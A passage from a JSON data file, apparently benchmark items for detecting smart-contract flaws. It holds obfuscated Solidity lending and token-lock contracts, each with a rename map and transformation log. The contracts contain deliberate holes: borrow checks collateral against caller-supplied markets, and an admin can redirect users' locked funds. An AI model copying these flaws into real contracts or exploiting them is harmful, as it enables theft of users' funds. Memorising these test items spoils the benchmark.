_0x3bc482\n    )\n        external\n        view\n        returns (\n            uint256 _0xbc49cb,\n            uint256 _0x4a08e1,\n            uint256 _0xad2a19\n        )\n    {\n        for (uint256 i = 0; i < _0x1553cb.length; i++) {\n            (uint256 _0x889a84, uint256 _0xec0adb, ) = this._0xc92b3e(\n                _0x1553cb[i],\n                _0x3bc482\n            );\n\n            _0xbc49cb += _0x889a84;\n            _0x4a08e1 += _0xec0adb;\n        }\n\n        if (_0x4a08e1 == 0) {\n            _0xad2a19 = type(uint256)._0xb1dcd2;\n        } else {\n            _0xad2a19 = (_0xbc49cb * 1e18) / _0x4a08e1;\n        }\n\n        return (_0xbc49cb, _0x4a08e1, _0xad2a19);\n    }\n}\n\ncontract ExactlyMarket {\n    IERC20 public _0xf86849;\n    DebtPreviewer public _0xe916e2;\n\n    mapping(address => uint256) public _0x200657;\n    mapping(address => uint256) public _0x746b3e;\n\n    uint256 public constant COLLATERAL_FACTOR = 80;\n\n    constructor(address _0x53ed79, address _0xc6ad12) {\n        _0xf86849 = IERC20(_0x53ed79);\n        _0xe916e2 = DebtPreviewer(_0xc6ad12);\n    }\n\n    function _0xc09ed2(uint256 _0x68ed60) external {\n        _0xf86849._0x4c7b1a(msg.sender, address(this), _0x68ed60);\n        _0x200657[msg.sender] += _0x68ed60;\n    }\n\n    function _0xa4b2ea(uint256 _0x68ed60, address[] calldata _0x1553cb) external {\n        (uint256 _0xbc49cb, uint256 _0x4a08e1, ) = _0xe916e2\n            ._0xf86c24(_0x1553cb, msg.sender);\n\n        uint256 _0x1029ff = _0x4a08e1 + _0x68ed60;\n\n        uint256 _0x3cb978 = (_0xbc49cb * COLLATERAL_FACTOR) / 100;\n        require(_0x1029ff <= _0x3cb978, \"Insufficient collateral\");\n\n        _0x746b3e[msg.sender] += _0x68ed60;\n        _0xf86849.transfer(msg.sender, _0x68ed60);\n    }\n\n    function _0xa5a888(\n        address _0x3bc482\n    )\n        external\n        view\n        returns (uint256 _0x889a84, uint256 _0x3a1dbf, uint256 _0x31423e)\n    {\n        return (_0x200657[_0x3bc482], _0x746b3e[_0x3bc482], 1e18);\n    }\n}\n",
      "rename_map": {
        "previewMultipleMarkets": "_0xf86c24",
        "getAccountSnapshot": "_0xa5a888",
        "collateralValue": "_0x82f3b3",
        "totalCollateral": "_0xbc49cb",
        "overallHealth": "_0xad2a19",
        "healthFactor": "_0xb4f329",
        "exchangeRate": "_0x31423e",
        "transferFrom": "_0x4c7b1a",
        "previewDebt": "_0xc92b3e",
        "_previewer": "_0xc6ad12",
        "collateral": "_0x889a84",
        "totalDebt": "_0x4a08e1",
        "balanceOf": "_0xed23e3",
        "previewer": "_0xe916e2",
        "maxBorrow": "_0x3cb978",
        "debtValue": "_0x9059e1",
        "deposits": "_0x200657",
        "borrowed": "_0x3a1dbf",
        "newDebt": "_0x1029ff",
        "markets": "_0x1553cb",
        "account": "_0x3bc482",
        "deposit": "_0xc09ed2",
        "borrows": "_0x746b3e",
        "amount": "_0x68ed60",
        "market": "_0x8d80bf",
        "_asset": "_0x53ed79",
        "borrow": "_0xa4b2ea",
        "asset": "_0xf86849",
        "debt": "_0xec0adb",
        "max": "_0xb1dcd2",
        "to": "_0x9dbb82"
      },
      "changes": [
        "Renamed 31 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_050",
      "transformed_id": "ss_l4_medium_sn_tc_050",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0xec5519, uint256 _0xc120c8) external returns (bool);\n\n    function _0xb8b158(\n        address from,\n        address _0xec5519,\n        uint256 _0xc120c8\n    ) external returns (bool);\n\n    function _0x2237fc(address _0x368bcc) external view returns (uint256);\n}\n\ncontract MunchablesLockManager {\n        bool _flag1 = false;\n        bool _flag2 = false;\n    address public _0xfdd964;\n    address public _0x19a514;\n\n    struct PlayerSettings {\n        uint256 _0x760749;\n        address _0x06969c;\n        uint256 _0x6073e4;\n        uint256 _0x7a1348;\n    }\n\n    mapping(address => PlayerSettings) public _0x6ee424;\n    mapping(address => uint256) public _0x03b4e9;\n\n    IERC20 public immutable _0xf64f37;\n\n    event Locked(address _0xfe1a8f, uint256 _0xc120c8, address _0x201f28);\n    event ConfigUpdated(address _0x115bb3, address _0xd516e7);\n\n    constructor(address _0xc87d5a) {\n        if (true) { _0xfdd964 = msg.sender; }\n        _0xf64f37 = IERC20(_0xc87d5a);\n    }\n\n    modifier _0x951bf3() {\n        require(msg.sender == _0xfdd964, \"Not admin\");\n        _;\n    }\n\n    function _0x979804(uint256 _0xc120c8, uint256 _0x342fae) external {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        require(_0xc120c8 > 0, \"Zero amount\");\n\n        _0xf64f37._0xb8b158(msg.sender, address(this), _0xc120c8);\n\n        _0x03b4e9[msg.sender] += _0xc120c8;\n        _0x6ee424[msg.sender] = PlayerSettings({\n            _0x760749: _0xc120c8,\n            _0x06969c: msg.sender,\n            _0x6073e4: _0x342fae,\n            _0x7a1348: block.timestamp\n        });\n\n        emit Locked(msg.sender, _0xc120c8, msg.sender);\n    }\n\n    function _0x6ca5c7(address _0xd4e446) external _0x951bf3 {\n        address _0x115bb3 = _0x19a514;\n        _0x19a514 = _0xd4e446;\n\n        emit ConfigUpdated(_0x115bb3, _0xd4e446);\n    }\n\n    function _0x54196f(\n        address _0xfe1a8f,\n        address _0xccf62e\n    ) external _0x951bf3 {\n        _0x6ee424[_0xfe1a8f]._0x06969c = _0xccf62e;\n    }\n\n    function _0x3c2c03() external {\n        PlayerSettings memory _0x2deb0c = _0x6ee424[msg.sender];\n\n        require(_0x2deb0c._0x760749 > 0, \"No locked tokens\");\n        require(\n            block.timestamp >= _0x2deb0c._0x7a1348 + _0x2deb0c._0x6073e4,\n            \"Still locked\"\n        );\n\n        uint256 _0xc120c8 = _0x2deb0c._0x760749;\n\n        address _0x201f28 = _0x2deb0c._0x06969c;\n\n        delete _0x6ee424[msg.sender];\n        _0x03b4e9[msg.sender] = 0;\n\n        _0xf64f37.transfer(_0x201f28, _0xc120c8);\n    }\n\n    function _0xdfa6fc(address _0xfe1a8f) external _0x951bf3 {\n        PlayerSettings memory _0x2deb0c = _0x6ee424[_0xfe1a8f];\n        uint256 _0xc120c8 = _0x2deb0c._0x760749;\n        address _0x201f28 = _0x2deb0c._0x06969c;\n\n        delete _0x6ee424[_0xfe1a8f];\n        _0x03b4e9[_0xfe1a8f] = 0;\n\n        _0xf64f37.transfer(_0x201f28, _0xc120c8);\n    }\n\n    function _0xb9630f(address _0x01bfb7) external _0x951bf3 {\n        if (1 == 1) { _0xfdd964 = _0x01bfb7; }\n    }\n}\n",
      "rename_map": {
        "setConfigStorage": "_0x6ca5c7",
        "setLockRecipient": "_0x54196f",
        "emergencyUnlock": "_0xdfa6fc",
        "playerSettings": "_0x6ee424",
        "playerBalances": "_0x03b4e9",
        "_configStorage": "_0xd4e446",
        "lockStartTime": "_0x7a1348",
        "lockRecipient": "_0x06969c",
        "configStorage": "_0x19a514",
        "transferAdmin": "_0xb9630f",
        "lockDuration": "_0x6073e4",
        "transferFrom": "_0xb8b158",
        "lockedAmount": "_0x760749",
        "newRecipient": "_0xccf62e",
        "newConfig": "_0xd516e7",
        "onlyAdmin": "_0x951bf3",
        "recipient": "_0x201f28",
        "balanceOf": "_0x2237fc",
        "oldConfig": "_0x115bb3",
        "duration": "_0x342fae",
        "newAdmin": "_0x01bfb7",
        "settings": "_0x2deb0c",
        "account": "_0x368bcc",
        "amount": "_0xc120c8",
        "player": "_0xfe1a8f",
        "unlock": "_0x3c2c03",
        "admin": "_0xfdd964",
        "_weth": "_0xc87d5a",
        "lock": "_0x979804",
        "weth": "_0xf64f37",
        "to": "_0xec5519"
      },
      "changes": [
        "Renamed 31 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    }
  ]
}